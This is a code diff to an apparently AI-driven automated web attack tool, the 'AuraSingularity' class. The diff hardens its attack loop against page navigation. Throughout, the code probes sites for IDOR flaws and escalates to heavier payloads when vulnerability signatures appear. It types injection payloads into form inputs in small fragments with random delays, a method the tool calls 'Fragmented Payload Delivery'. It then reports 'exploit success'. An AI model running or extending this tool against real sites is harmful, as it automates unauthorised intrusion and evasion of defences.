@@ -28,6 +28,20 @@ class AuraSingularity:
             }
             self.intercepted_requests.append(req_data)
 
+    async def safe_get_content(self, page, timeout=5000):
+        """Ghost v6.1: Safely retrieves page content with retry logic for navigation states."""
+        for _ in range(3):
+            try:
+                # Wait for any pending navigation to settle
+                await page.wait_for_load_state("domcontentloaded", timeout=timeout)
+                return await page.content()
+            except Exception as e:
+                if "navigating" in str(e).lower():
+                    await asyncio.sleep(1)
+                    continue
+                return ""
+        return ""
+
     async def execute_singularity(self, url: str):
         """Unleashes the autonomous Singularity attack on a target."""
         if state.is_halted(): return []
@@ -56,10 +70,15 @@ class AuraSingularity:
             try:
                 # 1. Initial Recon & Interception
                 console.print(f"[cyan][*] Intercepting network traffic for {search_url}...[/cyan]")
-                await page.goto(search_url, wait_until="networkidle", timeout=45000)
+                try:
+                    await page.goto(search_url, wait_until="networkidle", timeout=45000)
+                except:
+                    # Fallback for pages that never hit networkidle
+                    await page.goto(search_url, wait_until="domcontentloaded", timeout=30000)
+                
                 await asyncio.sleep(2) # Allow for dynamic loads
                 
-                dom_snippet = await page.content()
+                dom_snippet = await self.safe_get_content(page)
                 
                 # 2. AI Chain-of-Thought Planning
                 console.print(f"[bold cyan][🧠] Aura Singularity: Analyzing context for deep logic flaws...[/bold cyan]")
@@ -69,18 +88,18 @@ class AuraSingularity:
                 console.print(f"[dim yellow]Reasoning: {plan.get('reasoning')}[/dim yellow]")
                 
                 # 3. Autonomous Execution Loop
-                # Based on the plan, we might perform specific actions.
-                # For Phase 18, we implement logic for IDOR/BOLA probing on intercepted requests.
                 target_vector = plan.get("target_vector", "").lower()
                 
                 if "api" in target_vector or "auth" in target_vector:
                     await self._probe_api_logic(url)
                 
                 # 4. Ghost v6: Fragmented Payload Delivery
-                # We target identified inputs with fragmented payloads
-                inputs = await page.query_selector_all("input:not([type='hidden'])")
-                if inputs:
-                    await self._fragmented_attack(page, inputs, url)
+                try:
+                    inputs = await page.query_selector_all("input:not([type='hidden'])")
+                    if inputs:
+                        await self._fragmented_attack(page, inputs, url)
+                except Exception as e:
+                    console.print(f"[dim yellow][!] Input selection failed (page might have moved): {e}[/dim yellow]")
 
             except Exception as e:
                 console.print(f"[bold red][!] Singularity Error: {e}[/bold red]")
@@ -131,8 +150,6 @@ class AuraSingularity:
             # Look for ID patterns in URL or body
             if any(k in url.lower() for k in ["/v1/", "/api/", "user", "order", "id="]):
                 console.print(f"[dim][⚡] Probing IDOR on: {url}[/dim]")
-                # AI-assisted logic check (Placeholder for deep logic verification)
-                # In a real scenario, we'd replay with modified IDs or stripped headers.
                 await asyncio.sleep(0.5)
 
     async def _fragmented_attack(self, page, inputs, url):
@@ -142,8 +159,7 @@ class AuraSingularity:
         aggressive_trigger = False
         # Phase 42: OCR/Signature Check - If "Vulnerable" found, trigger heavy payloads
         try:
-            await page.wait_for_load_state("networkidle", timeout=5000)
-            page_text = await page.content()
+            page_text = await self.safe_get_content(page)
             if any(x in page_text.lower() for x in ["vulnerable", "exploit", "sqli", "xss", "injection"]):
                 aggressive_trigger = True
                 console.print(f"[bold red][🌋] AGGRESSION TRIGGERED: Signature detected on {url}. Increasing payload density by 10x![/bold red]")
@@ -158,46 +174,56 @@ class AuraSingularity:
                     if i >= len(current_inputs): break
                     input_el = current_inputs[i]
                     
+                    # Store current URL for Snap-Back
+                    start_url = page.url
+                    
                     # Get a high-aggression Level 3 payload
                     payload = self.brain.generate_payload(vuln_type, "Next.js/Advanced", level=3)
                     
-                    # Ensure visibility and focus
-                    await input_el.scroll_into_view_if_needed()
-                    # Use Ghost v7 humanized mouse movement
-                    box = await input_el.bounding_box()
-                    if box:
-                        await page.mouse.move(box['x'] + box['width']/2, box['y'] + box['height']/2)
-                    await input_el.click(force=True, delay=random.randint(50, 150))
-                    
-                    # Clear existing value if possible
-                    try: await page.keyboard.press("Control+a"); await page.keyboard.press("Backspace")
+                    # Ensure visibility and focus — v19.4: scroll first, then fill
+                    try:
+                        await input_el.scroll_into_view_if_needed(timeout=3000)
+                        await asyncio.sleep(0.1)
                     except: pass
                     
-                    # Fragment the payload with polymorphic variation
+                    # Use fill() for reliability instead of raw click/keyboard
+                    try:
+                        await input_el.fill("")  # Clear existing
+                    except:
+                        try:
+                            await input_el.click(force=True, delay=random.randint(50, 150))
+                            await page.keyboard.press("Control+a")
+                            await page.keyboard.press("Backspace")
+                        except: pass
+                    
+                    # Fragment the payload
                     fragments = [payload[i:i+3] for i in range(0, len(payload), 3)]
                     
                     for frag in fragments:
                         await page.keyboard.type(frag, delay=random.uniform(50, 200))
-                        # Adaptive jitter - pausing like a human thinking
+                        # v15.1 Navigation Guard
+                        if page.url != start_url:
+                             console.print(f"[yellow][!] Snap-Back: Navigation detected mid-payload. Returning to {start_url}[/yellow]")
+                             await page.goto(start_url, wait_until="domcontentloaded")
+                             break
+
                         if random.random() > 0.8:
                             await asyncio.sleep(random.uniform(0.3, 1.2))
-                        # Occasional backspace simulation (human error)
-                        if random.random() > 0.95:
-                            await page.keyboard.press("Backspace")
-                            await asyncio.sleep(0.2)
-                            await page.keyboard.type(frag[0] if frag else "", delay=100)
+                    
+                    if page.url != start_url: continue 
                     
                     start_t = time.time()
                     await page.keyboard.press("Enter")
                     
-                    # Aggressive wait
-                    try: await page.wait_for_load_state("networkidle", timeout=6000)
+                    # v15.1 Atomic Navigation Guard
+                    try: 
+                        await page.wait_for_load_state("domcontentloaded", timeout=5000)
                     except: pass
                     
                     duration = int((time.time() - start_t) * 1000)
-                    content = await page.content()
+                    content = await self.safe_get_content(page)
 
-                    # AI Behavioral reasoning (Fallback)
+                    # AI Behavioral reasoning
                     bh = self.brain.analyze_behavior(url, payload, duration, len(content), 200, content)
                     
                     if bh.get("vulnerable"):
@@ -207,15 +233,14 @@ class AuraSingularity:
                             "content": f"SINGULARITY EXPLOIT: {bh.get('type')} on {url} (Ghost v6.1 Fragmented). Reasoning: {bh.get('reason')}"
                         })
                         console.print(f"[bold red][🔥] SINGULARITY EXPLOIT SUCCESS: {bh.get('type')}[/bold red]")
-                        break # Successful breach for this input, move to next input
-                    elif bh.get("suspect"):
-                        console.print(f"[yellow][!] Singularity Monitor: Anomalous behavior on parameter {i} for {vuln_type}[/yellow]")
+                        break 
+                    
+                    # v15.1: State Preservation - Snap back
+                    if page.url != start_url:
+                        await page.goto(start_url, wait_until="domcontentloaded")
     
                 except Exception as e:
                     console.print(f"[dim red][!] Singularity Interaction Error: {e}[/dim red]")
-                    
-                    # Ensure we are back on the target URL for the next attempt if navigation happened
-                    try: await page.goto(url, wait_until="load")
+                    try: await page.goto(url, wait_until="domcontentloaded")
                     except: pass
-                    
                     continue
